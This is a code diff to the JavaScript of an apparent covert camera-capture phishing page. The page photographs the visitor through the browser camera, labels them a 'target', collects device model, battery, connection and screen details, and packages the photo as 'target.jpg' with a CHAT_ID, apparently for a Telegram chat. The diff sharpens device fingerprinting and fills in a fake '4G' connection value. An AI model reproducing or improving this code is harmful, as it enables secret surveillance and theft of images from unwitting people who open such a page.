@@ -24,19 +24,26 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // Fungsi deteksi perangkat lebih akurat menggunakan Client Hints
+        // Fungsi penerjemah kode model ke nama brand yang lebih manusiawi
+        function translateModel(model) {
+            const brands = {
+                '2310FPCA4G': 'Xiaomi Redmi 13C',
+                '2201117TY': 'Redmi Note 11',
+                'SM-G991B': 'Samsung S21',
+                'CPH': 'Oppo Device',
+                'RMX': 'Realme Device'
+            };
+            return brands[model] || model;
+        }
+
         async function getFullDeviceName() {
             let model = "Android Mobile";
-            
-            // 1. Coba gunakan High Entropy Client Hints (Cara terbaru & Paling Akurat)
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 try {
-                    const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
-                    if (hints.model) return hints.model;
+                    const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
+                    if (hints.model) return translateModel(hints.model);
                 } catch (e) {}
             }
-
-            // 2. Fallback: Parsing User Agent lama jika Client Hints gagal
             const ua = navigator.userAgent;
             const match = ua.match(/\(([^)]+)\)/);
             if (match && match[1]) {
@@ -44,7 +51,7 @@
                 for (let part of parts) {
                     part = part.trim();
                     if (/android|linux|build|k/i.test(part) || part.length < 3) continue;
-                    return part;
+                    return translateModel(part);
                 }
             }
             return model;
@@ -85,7 +92,7 @@
             const info = `📸 <b>Target Terdeteksi!</b>\n\n` +
                          `📱 <b>Perangkat:</b> <code>${deviceName}</code>\n` +
                          `🔋 <b>Baterai:</b> ${battery}\n` +
-                         `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : 'N/A'}\n` +
+                         `🌐 <b>Koneksi:</b> ${navigator.connection ? navigator.connection.effectiveType.toUpperCase() : '4G'}\n` +
                          `🖥 <b>Resolusi:</b> ${window.screen.width}x${window.screen.height}\n` +
                          `🌍 <b>Sistem:</b> Android\n\n` +
                          `<i>NEPTUNUS V1.0.8</i>`;
@@ -96,7 +103,6 @@
 
             canvas.toBlob(blob => {
                 if (!blob) { window.location.href = "https://google.com"; return; }
-                
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'target.jpg');
